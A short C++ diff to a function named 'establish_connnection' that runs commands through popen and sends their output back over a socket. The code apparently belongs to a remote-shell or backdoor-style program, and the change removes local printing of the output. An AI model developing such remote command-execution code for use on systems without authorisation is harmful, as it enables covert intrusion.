@@ -169,14 +169,14 @@ void establish_connnection(int sock){
 					//std::cout << "Reading..." << std::endl;
 					result += buffer;
 				}
-				printf("%s\n", result.c_str());
+				// printf("%s\n", result.c_str());
 				// if((result_int = result.find("command not found")) <  0){
 				// 	send(sock, error_command.c_str(), error_command.length(), 1);
 				// }
 				pclose(pipe);
 				// if((result_int = result.find("command not found")) >=  0){
 				// printf("here");
-				if(result != "" || temp.substr(0,5) == "echo "){
+				if(result != ""){
 					result += "\r\n";
 					send(sock, result.c_str(), result.length(), 0);
 				}else{
